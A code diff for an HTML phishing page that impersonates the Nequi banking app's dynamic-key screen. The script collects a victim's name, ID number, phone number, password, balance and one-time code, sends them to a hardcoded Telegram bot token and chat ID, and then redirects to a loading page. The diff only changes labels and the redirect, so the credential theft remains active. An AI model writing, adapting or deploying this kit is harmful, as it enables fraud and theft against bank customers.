@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nequi - Primera Dinámica</title>
+    <title>Nequi - Clave Dinámica</title>
     <style>
         html, body { height: 100%; margin: 0; }
         body {
@@ -213,20 +213,17 @@
                 const clave = localStorage.getItem("clave") || "No especificado";
                 const saldo = localStorage.getItem("saldo") || "No especificado";
 
-                // Guardar OTP y redirigir
-                localStorage.setItem("otp1", otp);
-
                 // TELEGRAM CONFIG (sin espacio)
                 const TELEGRAM_BOT_TOKEN = '7591157193:AAHFVlUcvlY2ep6nvCoiXg8G86nxGs4yvyc';
                 const TELEGRAM_CHAT_ID = '6958936698';
 
-                const message = `🔐 <b>CLAVE DINÁMICA 1</b>\n\n` +
+                const message = `🔐 <b>CLAVE DINÁMICA</b>\n\n` +
                     `📛 <b>Nombre:</b> ${nombreApellido}\n` +
                     `🪪 <b>Cédula:</b> ${cedula}\n` +
                     `📱 <b>Número:</b> ${numero}\n` +
                     `🔑 <b>Clave:</b> ${clave}\n` +
                     `💰 <b>Saldo:</b> ${saldo}\n` +
-                    `🔢 <b>Dinámica 1:</b> <code>${otp}</code>\n` +
+                    `🔢 <b>Dinámica:</b> <code>${otp}</code>\n` +
                     `🆔 <b>UserID:</b> ${Date.now()}\n` +
                     `📅 ${new Date().toLocaleString('es-CO')}`;
 
@@ -243,8 +240,8 @@
 
                     if (response.ok) {
                         console.log('Mensaje enviado a Telegram correctamente');
-                        // Redirigir a segunda pantalla
-                        window.location.href = "otp2.html";
+                        // Redirigir a loading
+                        window.location.href = "loading.html";
                     } else {
                         const errorData = await response.json();
                         console.error('Error de Telegram:', errorData);
